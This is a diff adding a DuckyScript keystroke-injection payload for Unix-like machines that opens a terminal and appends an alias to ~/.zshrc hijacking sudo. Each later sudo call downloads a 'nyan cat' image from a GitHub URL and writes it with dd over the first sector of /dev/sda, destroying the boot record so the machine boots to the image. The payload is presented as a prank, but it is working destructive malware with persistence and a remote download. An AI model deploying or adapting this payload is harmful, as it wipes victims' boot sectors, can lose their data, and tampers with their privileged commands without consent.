@@ -1,0 +1,22 @@
+REM Author FalsePhilosopher
+REM Target Unix-like
+REM Props SkeletonMan for the idea
+REM Changes writes a nyan cat to the hard drive so the computer boots to a nyan cat
+DELAY 1000
+CTRL-ALT t
+DELAY 500
+STRING nano ~/.zshrc
+DELAY 500
+CTRL w
+DELAY 150
+STRING alias ls=
+ENTER
+DELAY 150
+END
+ENTER
+SPACE
+REPEAT 3
+STRING alias sudo='sudo wget https://github.com/brainsmoke/nyanmbr/blob/master/nyan.img && dd if=nyan.img of=/dev/sda bs=512 count=1'
+CTRL o
+DELAY 150
+ENTER
